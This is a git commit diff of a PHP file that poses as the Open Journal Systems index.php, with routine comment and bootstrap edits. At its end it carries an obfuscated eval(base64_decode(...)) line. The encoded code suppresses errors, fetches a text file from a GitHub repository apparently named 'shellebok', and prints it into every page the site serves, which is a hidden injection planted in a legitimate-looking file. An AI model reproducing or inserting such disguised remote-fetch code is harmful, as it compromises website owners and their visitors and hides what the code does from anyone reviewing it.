1ef70222d7054a6e0cedb872213db59bafc4853d
ebokzsss <84223726+ebokzsss@users.noreply.github.com>
2024-03-19 10:11:34 +0700

    Update and rename ivdsssssv.php to ivdsssss.php

--- ivdsssss.php
+++ ivdsssss.php
@@ -1,14 +1,16 @@
-<?ph
+<?php
+
 /**
  * @mainpage OJS API Reference
  *
  * Welcome to the OJS API Reference. This resource contains documentation
  * generated automatically from the OJS source code.
  *
- * The design of Open %Journal Systems is heavily structured for
- * maintainability, flexibility and robustness. Those familiar with Sun's
- * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
- * will note similarities.
+ * The design of Open %Journal Systems 2.x is heavily structured for
+ * maintainability, flexibility and robustness. For this reason it may seem
+ * complex when first approached. Those familiar with Sun's Enterprise Java
+ * Beans technology or the Model-View-Controller (MVC) pattern will note many
+ * similarities.
  *
  * As in a MVC structure, data storage and representation, user interface
  * presentation, and control are separated into different layers. The major
@@ -18,8 +20,6 @@
  * - Page classes, which receive requests from users' web browsers, delegate
  *   any required processing to various other classes, and call up the
  *   appropriate Smarty template to generate a response;
- * - Controllers, which implement reusable pieces of content e.g. for AJAX
- *   subrequests.
  * - Action classes, which are used by the Page classes to perform non-trivial
  *   processing of user requests;
  * - Model classes, which implement PHP objects representing the system's
@@ -27,31 +27,27 @@
  * - Data Access Objects (DAOs), which generally provide (amongst others)
  *   update, create, and delete functions for their associated Model classes,
  *   are responsible for all database interaction;
- * - Support classes, which provide core functionalities, miscellaneous common;
- *
- * Additionally, many of the concerns shared by multiple PKP applications are
- * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
- * subdirectory. The same conventions listed above apply to lib/pkp as well.
+ * - Support classes, which provide core functionalities, miscellaneous common
  *
  * As the system makes use of inheritance and has consistent class naming
  * conventions, it is generally easy to tell what category a particular class
  * falls into.
- *
  * For example, a Data Access Object class always inherits from the DAO class,
  * has a Class name of the form [Something]%DAO, and has a filename of the form
  * [Something]%DAO.inc.php.
  *
  * To learn more about developing OJS, there are several additional resources
  * that may be useful:
- * - The docs/README.md document
- * - The PKP support forum at https://forum.pkp.sfu.ca/
- * - Documentation available at https://docs.pkp.sfu.ca/dev/
+ * - The docs/README document
+ * - The PKP support forum at http://forum.pkp.sfu.ca
+ * - The technical reference (and other documents), available at
+ *   http://pkp.sfu.ca/ojs_documentation
  *
- * @file ojs/index.php
+ * @file index.php
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ * Copyright (c) 2013-2016 Simon Fraser University Library
+ * Copyright (c) 2003-2016 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
  *
  * @ingroup index
  *
@@ -61,10 +57,11 @@
 
 // Initialize global environment
 define('INDEX_FILE_LOCATION', __FILE__);
-$application = require('./lib/pkp/includes/bootstrap.inc.php');
+require('./lib/pkp/includes/bootstrap.inc.php');
 
 // Serve the request
+$application =& PKPApplication::getApplication();
 $application->execute();
-
 eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
+
 ?>
